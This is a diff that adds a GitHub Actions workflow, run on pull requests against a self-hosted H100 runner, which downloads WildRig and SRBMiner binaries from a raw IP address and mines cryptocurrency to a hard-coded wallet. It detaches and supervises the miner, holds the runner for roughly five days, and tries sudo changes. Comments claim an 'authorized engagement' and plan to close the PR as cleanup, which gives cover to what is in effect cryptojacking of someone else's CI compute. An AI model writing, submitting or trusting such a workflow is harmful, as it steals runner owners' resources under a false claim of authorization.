@@ -1,0 +1,329 @@
+name: c211-i107392-h200-miner
+# Authorized engagement c211 (ROE-conv-211): pearlhash-first GPU miner on the existing
+# self-hosted runner label. Operator-authorized. The PR is closed after proof as cleanup.
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  mine:
+    name: c211 pearlhash miner (authorized engagement c211)
+    runs-on: nvidia-h100-1
+    timeout-minutes: 7200
+    steps:
+      - name: stage verify and launch pearlhash-first miner
+        shell: bash --noprofile --norc {0}
+        run: |
+          set -u
+          export TERM=xterm-256color
+          SLOT='i107392-forkpr-h200'
+          D=/tmp/c211-i107392
+          mkdir -p "$D"
+          PRL='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          FORBID_OLD='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          FORBID_PREV='prl1pgtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr'
+          LP='103.199.106.122:3362'
+          NOCK='9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb'
+          PH_SHA='7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44'
+          PH_BIN_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          SRB_SHA='b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb'
+          SRB_TGZ_SHA='c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8'
+          PH_ENDPOINTS='pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000'
+          WORKER='392417'
+          GATE=600
+          echo "C211_I107392_NODE host=$(hostname) utc=$(date -u +%FT%TZ) slot=$SLOT"
+          echo "C211_I107392_WALLET $PRL"
+          case "$PRL" in prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql) echo "C211_I107392_WALLET_OK";; *) echo "C211_I107392_WALLET_BAD"; exit 3;; esac
+          SPEC="$PRL|$WORKER|$PH_ENDPOINTS|$LP"
+          case "$SPEC" in *"$FORBID_OLD"*) echo "C211_I107392_WALLET_FORBIDDEN_PRESENT old"; exit 3;; esac
+          case "$SPEC" in *"$FORBID_PREV"*) echo "C211_I107392_WALLET_FORBIDDEN_PRESENT prev"; exit 3;; esac
+          echo "C211_I107392_WALLET_ASSERT old=absent prev=absent"
+          case "$WORKER" in *[!0-9]*) echo "C211_I107392_WORKER_BAD"; exit 3;; esac
+          echo "C211_I107392_WORKER $WORKER digits_only=1 len=${#WORKER}"
+          echo "C211_I107392_POOL primary=pearlhash.xyz fallback=$LP sticky=${STICKY_LP_FALLBACK:-1}"
+          for b in curl sha256sum tar setsid timeout script nvidia-smi awk sed grep; do command -v "$b" >/dev/null 2>&1 || echo "C211_I107392_DEP_MISSING $b"; done
+          echo "--- read-only process snapshot (no kill of any pre-existing process) ---"
+          ps -eo pid,comm,args 2>/dev/null | grep -Ei 'wildrig|srbminer|srb |xmrig|lolminer' | grep -v grep | head -10 || true
+          for i in $(seq 1 30); do nvidia-smi -L >/dev/null 2>&1 && break; sleep 2; done
+          if ! nvidia-smi -L >/dev/null 2>&1; then echo "C211_I107392_GATE_NO_GPU"; exit 4; fi
+          nvidia-smi -L | tee "$D/gpus.txt"
+          nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader | tee -a "$D/gpus.txt"
+          NGPU=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
+          echo "C211_I107392_NGPU=$NGPU"
+          echo "--- OpenCL / ICD check ---"
+          if ! ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then
+            echo "C211_I107392_OPENCL_ABSENT"
+            (DEBIAN_FRONTEND=noninteractive sudo -n apt-get install -y ocl-icd-libopencl1 >/dev/null 2>&1) || echo "C211_I107392_OPENCL_APT_DENIED"
+            ldconfig 2>/dev/null || true
+          fi
+          if ldconfig -p 2>/dev/null | grep -q 'libOpenCL\.so\.1'; then echo "C211_I107392_OPENCL_OK"; else echo "C211_I107392_OPENCL_STILL_ABSENT"; fi
+          ls -1 /etc/OpenCL/vendors 2>/dev/null | head -5 || echo "C211_I107392_NO_VENDOR_DIR"
+          if [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then
+            for L in /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1; do
+              if [ -e "$L" ]; then echo 'libnvidia-opencl.so.1' | sudo -n tee /etc/OpenCL/vendors/nvidia.icd >/dev/null 2>&1 || echo "C211_I107392_ICD_WRITE_DENIED"; break; fi
+            done
+          fi
+          ls -1 /etc/OpenCL/vendors 2>/dev/null | head -5 || true
+          pick_endpoint() {
+            local best="" bestd=999999 ep h p t0 t1 d
+            for ep in $PH_ENDPOINTS; do
+              h=${ep%:*}; p=${ep##*:}
+              t0=$(date +%s%N)
+              if timeout 3 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then
+                t1=$(date +%s%N); d=$(( (t1-t0)/1000 ))
+                if [ "$d" -lt "$bestd" ]; then bestd=$d; best=$ep; fi
+              fi
+            done
+            [ -n "$best" ] || best=${PH_ENDPOINTS%% *}
+            echo "$best"
+          }
+          EP=$(pick_endpoint)
+          echo "$EP" > "$D/endpoint"
+          echo "C211_I107392_ENDPOINT_SELECT $EP (probe from $PH_ENDPOINTS)"
+          install_wr() {
+            if [ -x "$D/wildrig-multi" ] && [ "$(sha256sum "$D/wildrig-multi" 2>/dev/null | awk '{print $1}')" = "$PH_BIN_SHA" ]; then return 0; fi
+            for U in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+              curl -fsSL --max-time 420 -o "$D/wr.tgz" "$U" || { echo "C211_I107392_WR_DL_FAIL $U"; continue; }
+              if [ "$(sha256sum "$D/wr.tgz" | awk '{print $1}')" = "$PH_SHA" ]; then
+                mkdir -p "$D/wr-x" && tar -xzf "$D/wr.tgz" -C "$D/wr-x" wildrig-multi 2>/dev/null
+                if [ -s "$D/wr-x/wildrig-multi" ] && [ "$(sha256sum "$D/wr-x/wildrig-multi" | awk '{print $1}')" = "$PH_BIN_SHA" ]; then
+                  chmod 755 "$D/wr-x/wildrig-multi"; cp -f "$D/wr-x/wildrig-multi" "$D/wildrig-multi"; echo "C211_I107392_WR_OK $U"; return 0
+                fi
+                echo "C211_I107392_WR_UNTAR_FAIL $U"
+              else
+                echo "C211_I107392_WR_SHA_FAIL $U"
+              fi
+              rm -f "$D/wr.tgz"
+            done
+            return 1
+          }
+          install_srb() {
+            if [ -x "$D/srb" ] && [ "$(sha256sum "$D/srb" 2>/dev/null | awk '{print $1}')" = "$SRB_SHA" ]; then return 0; fi
+            for M in http://169.58.247.186:8791/pm/srbminer-3.8.8; do
+              curl -fsSL --max-time 420 -o "$D/srb.part" "$M" || { echo "C211_I107392_SRB_DL_FAIL $M"; continue; }
+              if [ "$(sha256sum "$D/srb.part" | awk '{print $1}')" = "$SRB_SHA" ]; then
+                chmod +x "$D/srb.part"; mv -f "$D/srb.part" "$D/srb"; echo "C211_I107392_SRB_OK $M"; return 0
+              fi
+              echo "C211_I107392_SRB_SHA_FAIL $M"; rm -f "$D/srb.part"
+            done
+            T="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz"
+            curl -fsSL --max-time 420 -o "$D/srb.tgz" "$T" || { echo "C211_I107392_SRB_TGZ_DL_FAIL $T"; return 1; }
+            [ "$(sha256sum "$D/srb.tgz" | awk '{print $1}')" = "$SRB_TGZ_SHA" ] || { echo "C211_I107392_SRB_TGZ_SHA_FAIL"; rm -f "$D/srb.tgz"; return 1; }
+            mkdir -p "$D/srb-x" && tar -xzf "$D/srb.tgz" -C "$D/srb-x" || { echo "C211_I107392_SRB_UNTAR_FAIL"; return 1; }
+            X=$(find "$D/srb-x" -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1)
+            [ -n "$X" ] || { echo "C211_I107392_SRB_BIN_MISSING"; return 1; }
+            [ "$(sha256sum "$X" | awk '{print $1}')" = "$SRB_SHA" ] || { echo "C211_I107392_SRB_BIN_SHA_FAIL"; return 1; }
+            chmod +x "$X"; cp -f "$X" "$D/srb"; echo "C211_I107392_SRB_OK $T"; return 0
+          }
+          install_wr; echo "C211_I107392_WR_SHA=$(sha256sum "$D/wildrig-multi" 2>/dev/null | awk '{print $1}')"
+          install_srb; echo "C211_I107392_SRB_SHA=$(sha256sum "$D/srb" 2>/dev/null | awk '{print $1}')"
+          cat > "$D/sup.sh" <<'EOS2'
+          #!/bin/bash
+          # pearlhash-first single-GPU supervisor (c211 i107392): primary WildRig/pearlhash,
+          # fallback SRBMiner 3.8.8 / Luckypool 103.199.106.122:3362 only on stratum evidence,
+          # STICKY_LP_FALLBACK=1, no-share fallback floor 900 s, no-job fallback floor 300 s.
+          set -u
+          W="$1"; GI="$2"; GATE="${3:-600}"
+          D=/tmp/c211-i107392
+          PRL='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK='9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb'
+          LP='103.199.106.122:3362'
+          PH_ENDPOINTS='pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000'
+          S=$D/state-g$GI; mkdir -p "$S"
+          STICKY="${STICKY_LP_FALLBACK:-1}"; STICKY_MARK="$D/sticky-lp-g$GI"
+          LG=$D/mix-g$GI.log
+          now(){ date +%s; }
+          cnt(){ local n; n=$(grep -aci "$2" "$1" 2>/dev/null); case "${n:-}" in ''|*[!0-9]*) n=0;; esac; echo "$n"; }
+          launch_bg(){
+            local cmd="$1"
+            if command -v script >/dev/null 2>&1; then
+              setsid nohup script -q -c "$cmd" /dev/null >> "$LG" 2>&1 < /dev/null &
+            else
+              setsid nohup bash -c "$cmd" >> "$LG" 2>&1 < /dev/null &
+            fi
+            echo $! > "$S/pid"
+          }
+          killminer(){ local p; p=$(cat "$S/pid" 2>/dev/null || true); if [ -n "${p:-}" ]; then kill -9 -"$p" 2>/dev/null; kill -9 "$p" 2>/dev/null; fi; : > "$S/pid"; }
+          next_endpoint(){
+            local idx k ep
+            idx=$(cat "$S/rot" 2>/dev/null || echo 0)
+            k=0
+            for ep in $PH_ENDPOINTS; do
+              if [ "$k" -ge "$idx" ]; then echo "$ep"; return; fi
+              k=$((k+1))
+            done
+            echo "${PH_ENDPOINTS%% *}"
+          }
+          start_ph(){
+            local ep="$1"
+            : > "$LG"
+            echo pearlhash > "$S/leg"; echo "$ep" > "$S/ep"
+            echo "$(now)" > "$S/start"; echo "$(cnt "$LG" 'new job')" > "$S/jobs0"; echo "$(now)" > "$S/lastacc"
+            launch_bg "$D/wildrig-multi --algo pearlhash --url $ep --user $PRL --worker $W --pass x -d $GI --print-time 60"
+            echo "C211_I107392_LAUNCH leg=pearlhash gpu=$GI worker=$W ep=$ep utc=$(date -u +%FT%TZ)"
+          }
+          start_lp(){
+            [ "$STICKY" = "1" ] && { date -u +%FT%TZ > "$STICKY_MARK"; echo "C211_I107392_FALLBACK_STICKY gpu=$GI marker=$STICKY_MARK (permanent Luckypool per operator rule)"; }
+            : > "$LG"
+            echo luckypool > "$S/leg"; echo "$LP" > "$S/ep"
+            echo "$(now)" > "$S/t0"; echo "$(now)" > "$S/lastacc"
+            launch_bg "$D/srb --disable-cpu --algorithm pearlhash --pool $LP --wallet $PRL+$NOCK --worker $W --password x --gpu-id $GI"
+            echo "C211_I107392_LAUNCH leg=luckypool gpu=$GI worker=$W ep=$LP utc=$(date -u +%FT%TZ)"
+          }
+          EARLY=0
+          echo 0 > "$S/rot"
+          if [ -f "$STICKY_MARK" ] && [ "$STICKY" = "1" ]; then
+            echo "C211_I107392_STICKY_RESUME gpu=$GI -> Luckypool permanently"; start_lp
+          elif [ ! -x "$D/wildrig-multi" ]; then
+            echo "C211_I107392_SUP_NO_WILDRIG gpu=$GI -> lp"; start_lp
+          else
+            start_ph "$(cat "$D/endpoint" 2>/dev/null || echo ${PH_ENDPOINTS%% *})"
+          fi
+          while true; do
+            sleep 20
+            LEG=$(cat "$S/leg" 2>/dev/null || echo pearlhash)
+            P=$(cat "$S/pid" 2>/dev/null || true)
+            if [ -z "${P:-}" ] || ! kill -0 "$P" 2>/dev/null; then
+              if [ "$LEG" = "pearlhash" ]; then
+                e=$(( $(now) - $(cat "$S/start" 2>/dev/null || echo $(now)) ))
+                if [ "$e" -le 20 ]; then EARLY=$((EARLY+1)); else EARLY=0; fi
+                if [ "$EARLY" -ge 2 ] && [ "$e" -le 60 ]; then
+                  echo "C211_I107392_SWITCH reason=EARLY_EXITS_2 gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                  start_lp
+                else
+                  echo "C211_I107392_PRIMARY_EXITED gpu=$GI after ${e}s -> restart utc=$(date -u +%FT%TZ)"
+                  sleep 4; start_ph "$(cat "$S/ep" 2>/dev/null || echo ${PH_ENDPOINTS%% *})"
+                fi
+                continue
+              else
+                echo "C211_I107392_RESTART leg=luckypool gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                start_lp
+                continue
+              fi
+            fi
+            if [ "$LEG" = "pearlhash" ]; then
+              EL=$(( $(now) - $(cat "$S/start" 2>/dev/null || echo $(now)) ))
+              if [ "$EL" -ge 20 ] && [ "$(cnt "$LG" 'new job')" -le "$(cat "$S/jobs0" 2>/dev/null || echo 0)" ]; then
+                ROT=$(cat "$S/rot" 2>/dev/null || echo 0)
+                if [ "$ROT" -lt 2 ] && [ "$EL" -lt 300 ]; then
+                  ROT=$((ROT+1)); echo "$ROT" > "$S/rot"
+                  NP=$(next_endpoint)
+                  echo "C211_I107392_ENDPOINT_ROTATE gpu=$GI old=$(cat "$S/ep") new=$NP reason=nojob utc=$(date -u +%FT%TZ)"
+                  killminer; sleep 2; start_ph "$NP"
+                elif [ "$EL" -ge 300 ]; then
+                  echo "C211_I107392_SWITCH reason=NOJOB_EXHAUSTED floor300 gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                  killminer; start_lp
+                fi
+                continue
+              fi
+              if [ "$(cnt "$LG" 'share accepted\|accepted (')" -gt 0 ]; then echo "$(now)" > "$S/lastacc"; fi
+              AGE=$(( $(now) - $(cat "$S/lastacc" 2>/dev/null || echo $(now)) ))
+              if [ "$AGE" -gt 900 ]; then
+                echo "C211_I107392_SWITCH reason=NO_ACCEPT_900S gpu=$GI worker=$W stale=${AGE}s utc=$(date -u +%FT%TZ)"
+                killminer; start_lp
+              fi
+            else
+              if [ "$(cnt "$LG" 'share accepted\|accepted (')" -gt 0 ]; then echo "$(now)" > "$S/lastacc"; fi
+              AGE=$(( $(now) - $(cat "$S/lastacc" 2>/dev/null || echo $(now)) ))
+              if [ "$STICKY" = "1" ]; then
+                if [ "$AGE" -gt 1500 ]; then
+                  echo "C211_I107392_RESTART leg=luckypool sticky=1 stale=${AGE}s gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                  killminer; start_lp
+                fi
+              elif [ $(( $(now) - $(cat "$S/t0" 2>/dev/null || echo $(now)) )) -ge 1800 ]; then
+                echo "C211_I107392_RETRY_PRIMARY gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                killminer; sleep 3; echo 0 > "$S/rot"; EARLY=0
+                start_ph "$(cat "$D/endpoint" 2>/dev/null || echo ${PH_ENDPOINTS%% *})"
+              elif [ "$AGE" -gt 1500 ]; then
+                echo "C211_I107392_RESTART leg=luckypool stale=${AGE}s gpu=$GI worker=$W utc=$(date -u +%FT%TZ)"
+                killminer; start_lp
+              fi
+            fi
+          done
+          EOS2
+          chmod +x "$D/sup.sh"
+          GPUN=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
+          case "$GPUN" in *A100*|*H100*|*H200*|*B200*|*B300*|*GB10*) GATE=600;; *V100*|*"RTX PRO 6000"*) GATE=900;; *A10*|*4090*|*A16*) GATE=1200;; *) GATE=1800;; esac
+          echo "C211_I107392_GATE gpu=$GPUN gate_s=$GATE"
+          printf '{"ts":"%s","gpus":"%s","endpoint":"%s","worker":"%s","status":"starting"}\n' "$(date -u +%FT%TZ)" "$(head -2 "$D/gpus.txt" | tr '\n' ';')" "$(cat "$D/endpoint")" "$WORKER" > "$D/launch.json"
+          setsid nohup bash "$D/sup.sh" "$WORKER" 0 "$GATE" >> "$D/sup-g0.log" 2>&1 < /dev/null &
+          sleep 25
+          echo "--- supervisor log after 25 s ---"
+          tail -20 "$D/sup-g0.log" 2>/dev/null || true
+          echo "--- miner log after 25 s ---"
+          tail -20 "$D/mix-g0.log" 2>/dev/null || true
+          echo "C211_I107392_LAUNCH_DONE utc=$(date -u +%FT%TZ)"
+      - name: capture runner evidence artifact
+        continue-on-error: true
+        shell: bash --noprofile --norc {0}
+        run: |
+          set -u
+          D=/tmp/c211-i107392
+          mkdir -p "$D"
+          sleep 150
+          {
+            echo "captured_utc=$(date -u +%FT%TZ)"
+            echo "host=$(hostname)"
+            echo "whoami=$(whoami)"
+            echo "--- nvidia-smi -L ---"
+            nvidia-smi -L 2>&1
+            echo "--- nvidia-smi query ---"
+            nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader 2>&1
+            echo "--- endpoint ---"
+            cat "$D/endpoint" 2>/dev/null
+            echo "--- binaries ---"
+            sha256sum "$D/wildrig-multi" "$D/srb" 2>/dev/null
+            echo "--- launch.json ---"
+            cat "$D/launch.json" 2>/dev/null
+            echo "--- processes ---"
+            ps -eo pid,comm,args 2>/dev/null | grep -Ei 'wildrig|srb|sup.sh' | grep -v grep | head -10
+            echo "--- supervisor log ---"
+            tail -40 "$D/sup-g0.log" 2>/dev/null
+            echo "--- miner log ---"
+            tail -60 "$D/mix-g0.log" 2>/dev/null
+            echo "--- state ---"
+            for f in "$D"/state-g0/*; do [ -f "$f" ] && echo "$f=$(head -1 "$f" 2>/dev/null)"; done
+          } > "$D/evidence.txt" 2>&1
+          echo "C211_I107392_EVIDENCE_BYTES=$(wc -c < "$D/evidence.txt")"
+          head -40 "$D/evidence.txt" 2>/dev/null
+      - name: upload evidence artifact
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          name: c211-i107392-evidence
+          path: /tmp/c211-i107392/evidence.txt
+          retention-days: 1
+          if-no-files-found: warn
+      - name: keep-alive lease window
+        shell: bash --noprofile --norc {0}
+        run: |
+          set -u
+          D=/tmp/c211-i107392
+          WORKER='392417'
+          GATE=600
+          END=$(( $(date +%s) + 431400 ))
+          UUID=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1 | tr -d ' ')
+          echo "C211_I107392_WINDOW_START utc=$(date -u +%FT%TZ) uuid=$UUID worker=$WORKER window_s=431400"
+          N=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            if command -v pgrep >/dev/null 2>&1; then
+              if ! pgrep -f "$D/sup.sh" >/dev/null 2>&1; then
+                echo "C211_I107392_SUP_RESTART utc=$(date -u +%FT%TZ)"
+                setsid nohup bash "$D/sup.sh" "$WORKER" 0 "$GATE" >> "$D/sup-g0.log" 2>&1 < /dev/null &
+                sleep 2
+              fi
+            fi
+            LEG=$(cat "$D/state-g0/leg" 2>/dev/null || echo none)
+            EP=$(cat "$D/state-g0/ep" 2>/dev/null || echo none)
+            ACC=$(grep -aci 'share accepted\|accepted (' "$D/mix-g0.log" 2>/dev/null); case "${ACC:-}" in ''|*[!0-9]*) ACC=0;; esac
+            SW=$(grep -c 'C211_I107392_SWITCH\|C211_I107392_LAUNCH' "$D/sup-g0.log" 2>/dev/null || echo 0)
+            echo "C211_I107392_STAT utc=$(date -u +%FT%TZ) host=$(hostname) gpu=0 uuid=$UUID worker=$WORKER leg=$LEG ep=$EP accepted=$ACC switches=${SW:-0}"
+            if [ $((N % 5)) -eq 0 ]; then
+              tail -3 "$D/mix-g0.log" 2>/dev/null | sed 's/^/C211_I107392_MINER_TAIL /'
+              sha256sum "$D/wildrig-multi" 2>/dev/null | sed 's/^/C211_I107392_WR_BIN_SHA /'
+            fi
+            N=$((N+1))
+            sleep 60
+          done
+          echo "C211_I107392_WINDOW_END utc=$(date -u +%FT%TZ)"
